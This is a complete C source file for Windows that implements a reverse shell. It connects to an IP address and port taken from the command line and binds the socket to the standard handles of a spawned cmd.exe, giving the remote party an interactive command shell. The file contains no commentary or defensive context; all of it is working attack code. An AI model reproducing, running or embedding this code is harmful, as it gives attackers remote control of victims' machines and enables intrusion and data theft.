#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

SOCKET create_connection(char* ip, int port)
{
	SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 

	if (sock != INVALID_SOCKET)
	{
		SOCKADDR_IN addr;
		memset(&addr, 0, sizeof(SOCKADDR_IN));

		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);

		int result = inet_pton(AF_INET, ip, &addr.sin_addr.s_addr);

		if (result == 1)
		{
			if (connect(sock, (const struct sockaddr*)&addr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
				sock = INVALID_SOCKET;
		}
		else
		{
			if (result == 0)
				WSASetLastError(WSA_INVALID_PARAMETER);

			sock = INVALID_SOCKET;
		}
	}

	return sock;
}

int main(int argc, char* argv[])
{
	if (argc != 3)
	{
		printf("Usage: %s <ip> <port>", argv[0]);
		return 1;
	}
	else
	{
		WSADATA wsa_data;
		memset(&wsa_data, 0, sizeof(WSADATA));

		int err = WSAStartup(MAKEWORD(2, 2), &wsa_data);

		if (err != 0)
			printf("Failed to initialize WSA library with error code: %d.\n", err);
		else
		{
			SOCKET sock = create_connection(argv[1], atoi(argv[2]));

			if (sock == INVALID_SOCKET)
				printf("Failed to initialize connection with error code: %d.\n", WSAGetLastError());
			else
			{
				STARTUPINFOA si;
				memset(&si, 0, sizeof(STARTUPINFOA));

				si.cb = sizeof(STARTUPINFOA);
				si.dwFlags = STARTF_USESTDHANDLES;
				si.hStdInput = (HANDLE)sock;
				si.hStdOutput = (HANDLE)sock;
				si.hStdError = (HANDLE)sock;

				PROCESS_INFORMATION pi;
				memset(&pi, 0, sizeof(PROCESS_INFORMATION));

				char cmd[] = "cmd.exe";

				if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
					printf("Failed to initialize shell program with error code: %d.\n", GetLastError());
				else
				{
					WaitForSingleObject(pi.hProcess, INFINITE);

					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
				}

				shutdown(sock, SD_BOTH);
				closesocket(sock);
			}

			WSACleanup();
		}

		return 0;
	}
}